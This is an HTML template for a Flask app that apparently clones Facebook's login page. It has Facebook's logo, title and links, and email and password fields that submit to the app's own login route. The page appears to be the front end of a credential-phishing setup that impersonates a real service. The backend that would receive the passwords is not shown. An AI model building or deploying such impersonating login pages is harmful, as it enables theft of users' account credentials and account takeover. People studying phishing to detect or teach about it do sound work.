<!DOCTYPE html>
<html>
<head>
    <title>Facebook Login</title>
    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='style.css') }}">
    <link rel="icon" href="favi.png" type="image/png">

</head>
<body>
    <div class="container">
        
        <form method="post" action="{{ url_for('login') }}">
            <div class="container1">
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="#1877f2" class="bi bi-facebook" viewBox="0 0 16 16">
                    <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"/>
                </svg>
            </div>
            <input type="text" name="email" placeholder="Email or phone number"><br>
            <input type="password" name="password" placeholder="Password"><br>
            {% if error %}
            <p class="error">Email ou mot de passe incorrect</p>
            {% endif %}    
            <input type="submit" value="login">
            <div class="links">
                <a href="#">Forgot account?</a>
                <a href="#">Sign up for Facebook</a>
            </div>
        </form>
    </div>
</body>
</html>
